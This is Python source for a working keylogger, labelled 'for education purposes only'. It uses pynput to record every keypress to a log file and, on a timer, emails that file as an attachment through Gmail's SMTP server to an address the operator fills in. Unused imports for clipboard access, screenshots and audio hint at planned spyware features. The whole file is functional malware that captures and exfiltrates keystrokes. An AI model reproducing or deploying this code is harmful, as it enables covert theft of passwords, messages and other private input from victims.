
# This is a working keylogger with spyware like functionality, 
# I created this just for education purposes only, Don't use 

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

from dotenv import load_dotenv

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write


from cryptography.fernet import Fernet

import getpass
from requests import get 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

class KeyLogger:
    def __init__(self, file_path, keys_information, toaddr, email_address, password, timer):
        self.file_path = file_path
        self.keys_information = keys_information
        self.extend = "\\"
        self.count = 0
        self.keys = []
        self.toaddr = toaddr
        self.email_address = email_address
        self.password = password
        self.timer = timer
        self.last_email_time = time.time()
        
        

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        current_time = time.time()

        if self.count >= 1:
            self.count = 0
            self.write_file()
            if current_time - self.last_email_time >= self.timer:
                self.send_email()
                self.last_email_time = current_time

    def write_file(self):
        with open(self.file_path + self.extend + self.keys_information, "a") as f:
            for key in self.keys:
                k = str(key).replace("'", "")
                if k == "Key.enter":
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)
            self.keys = []

    # This function will send the key_log.txt file to the email address you indicated.
    def send_email(self):
        fromaddr = self.email_address
        toaddr = self.toaddr
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "Log File"
        body = "Body_of_the_mail"
        msg.attach(MIMEText(body, 'plain'))
        filename = self.keys_information
        attachment = open(self.file_path + self.extend + self.keys_information, 'rb')
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, self.password)
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    
    
    def on_release(self, key):
        if key == Key.esc:
            return False


if __name__ == "__main__":
    file_path = " " # File path where you want to save the key_log.txt file
keys_information = "key_log.txt" 
toaddr = " " # Email Address you want to send it to.
email_address = " " # Email Address you will be sending it from.
password = " " # This is an app password, Make sure to create one for an app on gmail website.
timer_minutes = 1 # Minute(s) the email will iterate over the period of time.
timer = timer_minutes * 60 # convert minutes to seconds

logger = KeyLogger(file_path, keys_information, toaddr, email_address, password, timer)

with Listener(on_press=logger.on_press, on_release=logger.on_release) as listener:
    listener.join() 


